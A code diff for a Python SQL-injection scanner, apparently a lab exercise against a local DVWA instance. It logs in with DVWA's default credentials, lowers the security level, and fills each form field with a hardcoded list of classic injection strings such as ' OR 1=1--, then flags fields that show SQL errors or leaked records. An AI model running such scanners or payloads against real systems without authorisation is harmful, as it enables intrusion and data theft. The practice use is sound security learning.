@@ -1,21 +1,60 @@
 import requests
 import json
+from bs4 import BeautifulSoup
+
+BASE = "http://localhost:8080/"
+LOGIN_URL = BASE + "login.php"
 
 session = requests.Session()
 
-# -------- LOAD FILES --------
-with open("urls.json", "r") as f:
-    urls = json.load(f)
+# ---------- LOGIN TO DVWA ----------
+def login():
 
-with open("forms.json", "r") as f:
-    forms = json.load(f)
+    res = session.get(LOGIN_URL)
+    soup = BeautifulSoup(res.text, "html.parser")
 
-with open("payloads.txt", "r") as f:
-    payloads = [line.strip() for line in f if line.strip()]
+    token = soup.find("input", {"name": "user_token"})
+    token_value = token["value"] if token else ""
 
-vulnerabilities = []
+    data = {
+        "username": "admin",
+        "password": "password",
+        "Login": "Login",
+        "user_token": token_value
+    }
 
-# -------- SQL ERROR PATTERNS --------
+    login = session.post(LOGIN_URL, data=data)
+
+    if "logout.php" in login.text:
+        print("Login successful\n")
+    else:
+        print("Login failed")
+        exit()
+
+    # set DVWA security level
+    session.cookies.set("security", "low")
+
+
+# ---------- LOAD FORMS ----------
+def load_forms():
+    with open("forms.json", "r") as f:
+        return json.load(f)
+
+
+# ---------- SQL PAYLOADS ----------
+payloads = [
+    "'",
+    "\"",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 'a'='a",
+    "\" OR \"1\"=\"1",
+    "' OR 1=1#",
+    "admin'--"
+]
+
+
+# ---------- SQL ERROR PATTERNS ----------
 errors = [
     "you have an error in your sql syntax",
     "warning: mysql",
@@ -25,98 +64,93 @@ errors = [
     "database error"
 ]
 
-print("Starting SQL Injection Scan...\n")
 
-# -------- SCAN URL PARAMETERS --------
-for url in urls:
+# ---------- SUCCESS PATTERNS ----------
+success_patterns = [
+    "first name",
+    "surname",
+    "user id exists"
+]
 
-    print("Scanning URL:", url)
 
-    for payload in payloads:
+# ---------- SQLI SCANNER ----------
+def scan_forms(forms):
 
-        try:
-            test_url = url + "?id=" + payload
-            res = session.get(test_url)
+    vulnerabilities = []
+    seen = set()
 
-            content = res.text.lower()
+    for form in forms:
 
-            for error in errors:
+        action = form["action"]
+        method = form["method"]
+        inputs = form["inputs"]
 
-                if error in content:
-
-                    print("SQL Injection Found in URL!")
-                    print("URL:", test_url)
-                    print()
-
-                    vulnerabilities.append({
-                        "type": "SQL Injection",
-                        "url": test_url,
-                        "payload": payload
-                    })
-
-                    break
-
-        except:
+        # skip login form
+        if "login.php" in action:
             continue
 
+        print("Scanning Form:", action)
 
-# -------- SCAN FORMS --------
-for form in forms:
+        for payload in payloads:
 
-    action = form["action"]
-    method = form["method"]
-    inputs = form["inputs"]
+            data = {}
 
-    print("Scanning Form:", action)
+            for inp in inputs:
 
-    for payload in payloads:
+                name = inp.get("name")
+                if not name:
+                    continue
 
-        data = {}
+                if inp["type"] == "submit":
+                    data[name] = "Submit"
+                else:
+                    data[name] = payload
 
-        for inp in inputs:
+            try:
 
-            name = inp.get("name")
+                if method == "post":
+                    res = session.post(action, data=data)
+                else:
+                    res = session.get(action, params=data)
 
-            if not name:
+                content = res.text.lower()
+
+                # detect SQL errors OR successful injection results
+                if (any(error in content for error in errors) or
+                    any(pattern in content for pattern in success_patterns)):
+
+                    key = action + payload
+                    if key not in seen:
+                        seen.add(key)
+
+                        print("SQL Injection Found!")
+                        print("URL:", action)
+                        print("Payload:", payload)
+                        print()
+
+                        vulnerabilities.append({
+                            "type": "SQL Injection",
+                            "url": action,
+                            "payload": payload
+                        })
+
+            except requests.exceptions.RequestException:
                 continue
 
-            if inp["type"] == "submit":
-                data[name] = "Submit"
-            else:
-                data[name] = payload
-
-        try:
-
-            if method == "post":
-                res = session.post(action, data=data)
-            else:
-                res = session.get(action, params=data)
-
-            content = res.text.lower()
-
-            for error in errors:
-
-                if error in content:
-
-                    print("SQL Injection Found in Form!")
-                    print("URL:", action)
-                    print("Payload:", payload)
-                    print()
-
-                    vulnerabilities.append({
-                        "type": "SQL Injection",
-                        "url": action,
-                        "payload": payload
-                    })
-
-                    break
-
-        except:
-            continue
+    return vulnerabilities
 
 
-# -------- SAVE RESULTS --------
+# ---------- MAIN ----------
+login()
+
+forms = load_forms()
+
+print("Starting SQL Injection Scan...\n")
+
+vulnerabilities = scan_forms(forms)
+
+# ---------- SAVE RESULTS ----------
 with open("vulnerabilities.json", "w") as f:
     json.dump(vulnerabilities, f, indent=4)
 
-print("\nScan Completed")
+print("Scan Completed")
